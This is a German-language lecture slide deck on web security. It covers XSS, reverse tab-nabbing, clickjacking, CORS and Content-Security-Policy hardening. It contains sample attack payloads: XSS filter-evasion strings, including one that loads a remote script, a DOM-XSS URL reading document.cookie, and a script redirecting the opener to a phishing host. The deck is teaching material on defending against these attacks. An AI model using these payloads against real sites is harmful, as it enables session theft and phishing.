---
author: Andreas Happe
title: Web Security
--- 

# Client-Side Attacks / HTTP-Header Hardening

## Angriffe gegen den Browser

* häufig als Teil von Social Engingeering
* Water-Hole Attacks

## Gegenmassnahme: HTTP-Header

* Server teilen dem Browser erwartetes Verhalten mit
* HTTP-Header wie Cookie-Header oder HSTS
* teilweise HTML-Directives
* Immer Browser-Versions abhängig, siehe auch [caniuse](https://caniuse.com/)

## Redux: Cookie Header

``` http
Set-Cookies: cookie=wert; Path=/app; Secure; HttpOnly; SameSite=Lax;
```

* Secure, HttpOnly und SameSite=Lax verwenden
* Path verwenden, vor allem wenn mehrere Applikationen am Server

* Ohne Expires/Max-Age: Session-Cookie wird beim Schließen des Browsers gelöscht
* Ohne Domain: nur aktueller Origin gültig

# Javascript-Injectons (XSS)

## Grundproblem

* Angreifer findet einen Weg um Javascript innerhalb der Webseite zu platzieren
* Angriff wird im Browser des Opfers durchgeführt, wenn dieser die Webseite betrachtet
* Drei grobe Arten: reflected, persistend, DOM-based XSS

## Reflected XSS

![Picture](0x08_reflexted_xss.png){.stretch}

* Javascript wird vom Webserver zurückreflektiert
* non-persistent
* meistens ist eine soziale Komponente notwendig
* http://opfer.xyz/operation?parameter=alert(1);

## Stored/Persistent XSS

Javascript wird am Server gespeichert

Z.b. folgendes als Chat-Nachricht:
``` html
<script>alert(1);</script>
```

## DOM-based XSS

* DOM-based
* Durch Modifikation/Injecten des Schadcodes im DOM
* Server ist nicht direkt involviert

## Beispiel

http://www.some.site/page.html?default=French

``` html
<select><script>
document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
document.write("<OPTION value=2>English</OPTION>");
</script></select>
```

``` url
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
```

## DOM-based: warum interessant?

- Documentation am Server?
- http://snikt.net/app/javascript/docs/something.html

## uXSS

Angriffe gegen den Browser..

## mXSS

Browser modifizieren übertragenen Code und "erzeugen" auf diese Weise XSS-verseuchte Webseiten

* z.B. bei Verwendung von X-XSS-Protection

## XSS kann an vielen Stellen auftreten

```html
<script>alert(1);</script>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC="jav    ascript:alert('XSS');">
<BGSOUND SRC="javascript:alert('XSS');">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

## Payloads

* Session Stealing
* Virtual Defacement
* Crypto-Mining
* [DDoS-Angriffe](https://de.wikipedia.org/wiki/Low_Orbit_Ion_Cannon)
* [Further Social Engineering](https://beefproject.com/)

## Gegenmaßnahme: Input Filtering/Sanitation

* werden Daten eingegeben, müssen diese auf Schadmuster hin überprüft werden
* Ist nur sinnvoll mit gemaintainten Bibliotheken durchführbar
* Hardening: Web Application Firewalls (Problem: False-Positives)

## Gegenmaßnahme: Quoting

* werden user-generierte Daten ausgegeben, müssen diese encoded werden
* “nicht so einfach..”: verschiedene scopes
* [XSS Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md)

## Quoting kann komplex werden

* Context ist wichtig, folgendes Code-Fragment am Server
* taintedVar muss sowohl js- als auch html-encoded sein

``` html
<script>
 var x = '<%= taintedVar %>';
 var d = document.createElement('div');
   d.innerHTML = x;
   document.body.appendChild(d);
</script>
```

## Gegenmassnahme Quoting

* HTML-Renderer vermeiden
  * element.write
  * element.writeln
  + innerHTML
  * outerHTML
* Bei gewissen Funktionen double-quoting verwenden
* Achtung bei on* Handlern und Quoting
* [Weiterführende Hints](https://www.owasp.org/images/0/07/Xenotix_XSS_Protection_CheatSheet_For_Developers.pdf)

## Hardening: X-XSS-Protection

* Aktiviert die XSS Protection des Browsers
* Sollte vor Reflected-XSS schützen
* Werte:
  * 0: disabled
  * 1: enabled, input wird sanitized
  * 1; mode=block: enabled, die page wird nicht gerendert
* Anti-XSS Heuristic wird nur noch von IE unterstützt..


## Hardening: Content Security Policy

- waren primär also Anti-XSS Schutz gedacht
- script-src Direktiven
- kommen gleich..

## Zusammenspiel der Absicherungen

![Zusammenfassung](0x08_xss_summary.png){.stretch}

# Reverse Tab-Nabbing

## GrundIdee

Wird ein externer Link in einem neuen Browserfenster/tab aufgemacht, kann die aufgemachte Seite die Location der aufmachenden Seite ändern.

## Aufmachende Seite

``` html
<html>
 <body>
   <li><a href="bad-website.com" target="_blank">Vulnerable target using html link to open the new page</a></li>
     <button onclick="window.open('https://bad-website.com')">Vulnerable target using javascript to open the new page</button>
  </body>
</html>
```

## Angriff: aufgemachte Seite

``` html
<html>
 <body>
   <script>
      if (window.opener) {
            window.opener.location = 'https://phish.example.com';
      }
   </script>
 </body>
</html>
```

## Gegenmaßnahmen

* keine externen Webseiten verlinken
* rel=”noopener noreferrer” bei Link verwenden

``` html
<a href="bad-website.com" rel="noopener noreferrer" target="_blank">Vulnerable target using html link to open the new page</a>
</html>
```

* Referrer-Policy setzen (no-referrer)

## Referrer-Policy

* Kontrolliert den Referer-Header des Browsers
* Referer vs Referrer

## Mögliche Einstellungen

| Wert | Beschreibung |
|------|--------------|
| no-referrer| Referer Header wird nie gesetzt | 
| no-referrer-when-downgrade | default, no https->http |
| origin| nur origin wird gesendet |
| origin-when-cross-origin | |
| same-origin | referrer nur wenn same-origin |
| strict-origin | only set origin, no https->http |
| strict-origin-when-cross-origin | new-default (2021) |
| unsafe-url | Referrer immer gesetzt |

# Clickjacking

## Angriff

![Picture](0x09_clickjacking.jpg){.stretch}

## Gegenmassnahme: X-Frame-Options

* Mögliche Werte:
  * DENY
  * SAMEORIGIN
  * ALLOW-FROM $origin

## Not-Perfect

* Probleme bei double-framing
* Mehrere Origins können nicht angegeben werden
* Handhabung wenn X-Frame-Options Header [mehrfach vorkommt](https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger)
* CSP verbessert den Schutz

# SOP/CORS

## Cross-Origin Resource Sharing (CORS)

Aufweichen der SOP

Beispiel: Browser lädt eine Webseite (web.snikt.net), diese will mittels Javascript auf service.snikt.net zugreifen

## Simple Case: Request

* Browser befindet sich auf web.snikt.net
* Will auf service.snikt.net zugreifen
* Setzt dafür den Origin Header beim JS-Zugriff auf service.snikt.net

``` http
Origin: web.snikt.net
```

## Simple Case: Response

Das Antwortdokument des Services beinhaltet einen zusätzlichen Header der anzeigt, wer diese Operation aufrufen darf:

``` http
Access-Control-Allow-Origin: https://web.snikt.net
```

* Browser weiss nun, dass er diese Daten verarbeiten darf
* Da dies eine "safe" Operation ist, kann am service-Service nichts geschehen
* Bitte nicht: Access-Control-Allow-Origin: *

## Was bei Daten-Verändernden Operationen?

* Preflight-Authorisation
* Browser sendet HTTP OPTIONS zum Service
* Origin-Header wird wieder auf web.snikt.net gesetzt
* Beispielsantwort

``` http
Access-Control-Allow-Origin: https://web.snikt.net
Access-Control-Allow-Methods: PUT, DELETE
```

* Danach sendet der Browser erst den Daten-verändernden Request

## Zusammengefasst

![Picture](0x09_cors.png){.stretch}


# Content-Security-Policy (CSP)

## Entstehungsgeschichte

- "logische" Erweiterung aus SOP
- SOP: Schützt die eigene Seite vor fremden Zugriffen
- CSP: Definiert wo in der eigenen Seite JavaScript vorkommen darf

## Basic-Form

~~~ http
Content-Security-Policy: <policy-directive>; <policy-directive>
~~~

Report-Only:

~~~ http
Content-Security-Policy-Report-Only: <policy-directive>; <policy-directive>
~~~

## Verhalten bei mehreren Headern

- nachfolgende Header können zuvorige nur verschärfen

## Direktiven (Auszug)

- script-src, style-src, font-src, media-src, img-src, ..
- frame-src, frame-ancestors
- form-action
- base-uri
- upgrade-insecure-requests, block-all-mixed-content
- report-uri
- default-src

[Genauere Informationen online](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)

## Sources (Werte für Direktiven)

- 'none'
- 'self'
- 'unsafe-inline', 'unsafe-eval', 'strict-dynamic'
- scheme (http:, https:)
- hostname (e.g., https://generali.at)

## Beispiele

~~~
# resourcen nür über https
Content-Security-Policy: default-src https:

# Javascript darf nur in getrennten JS-Files am eigenen Server vorkommen:
Content-Security-Policy: script-src 'self';

# limit fonts und grafiken
Content-Security-Policy: font-src: https://google-fonts.com; img-src 'self' https://img.generali.at;

# limit javascript to script.generali.at
Content-Security-Policy: script-src https://script.generali.at;
~~~

## XSS-Protection

~~~
# limit javascript to scripts from scripts.generali.at
Content-Security-Policy: script-src https://scripts.generali.at;
~~~

Auch wenn der Angreifer im HTML-Code Javascript hinterlegen kann, wird es nicht ausgeführt:

~~~ html
<html>
  <body>
    <script>alert(1);</script>
	</body>
</html>
~~~

## Verwendung von Javascript

Funktioniert nicht mehr:

~~~ html
<button class='my-javascript-button' onclick="alert('hello');">
~~~

Stattdessen: in eigenem Javascript-File:

~~~html
<script src="https://script.generali.at/somescript.js"></script>
~~~

~~~ javascript
$(document).ready(function () {
  $('.my-javascript-button').on('click', function() {
	    alert('hello');
	});
});
~~~

## Problem: Polyglot Files

- [Bypassing CSP using polyglot files](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)

## Negative Shortcuts

'unsafe-inline' und 'unsafe-eval' entfernen viel von der Schutzwirkung..

~~~ http
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';
~~~

## CSP is hard

[Restricting The Scripts, You're To Blame, You Give CSP a Bad name](https://www.youtube.com/watch?v=jeTGBSL4eQs)

## Reporting 1/2

~~~ http
Content-Security-Policy-Report-Only: default-src 'none'; style-src cdn.example.com; report-uri: /csp-reports
~~~

~~~ html
<!DOCTYPE html>
<html>
	<head>
		<title>Sign Up</title>
		<link rel="stylesheet" href="css/style.css">
	</head>
	<body>
		... Content ...
	</body>
</html>
~~~

## Reporting 2/2

~~~ json
{
  "csp-report": {
	    "document-uri": "http://example.com/signup.html",
			"referrer": "",
			"blocked-uri": "http://example.com/css/style.css",
			"violated-directive": "style-src cdn.example.com",
			"original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports",
			"disposition": "report"
	}
}
~~~

## Tooling

- Viele Scanner analysieren bereits CSP Direktiven
- [CSPScanner](https://cspscanner.com/)

## [CSP with Google](https://csp.withgoogle.com): Nonces (since 2015)

Nonce: zufälliger nicht-erratenbarer Wert, wird per CSP definiert

~~~ http
Content-Security-Policy: script-src 'nonce-r@nd0m';
~~~

Script-Tags werden ausgeführt, wenn sie den korrekten Nonce verwenden:

~~~ html
<script nonce="r@nd0m">
	doWhatever();
</script>
~~~

## CSP-with-Google

~~~ http
Content-Security-Policy: default-src https:; script-src 'nonce-{random}'; object-src 'none'
~~~

  > This policy will require all resources to be loaded over HTTPS, allow only script elements with the correct nonce attribute, and prevent loading any plugins.

## [CSP-with-Google](https://csp.withgoogle.com/docs/strict-csp.html#example): strict-CSP

~~~ http
Content-Security-Policy:
  object-src 'none';
	script-src 'nonce-{random}' 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;
	base-uri 'none';
	report-uri https://your-report-collector.example.com/
~~~

- unsafe-inline wird von neueren Browsern deaktiviert, falls nonce gesetzt
- strict-dynamic erlaubt das indirekte Laden von javascript, disabled http: und https:
- ganz alte browser fallen also auf http: und https: zurück
- unsafe-eval um Adaption zu erleichtern (sollte entfernt werden)

## CSP-Scanner

- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [CSP Scanner](https://cspscanner.com/)

# FIN
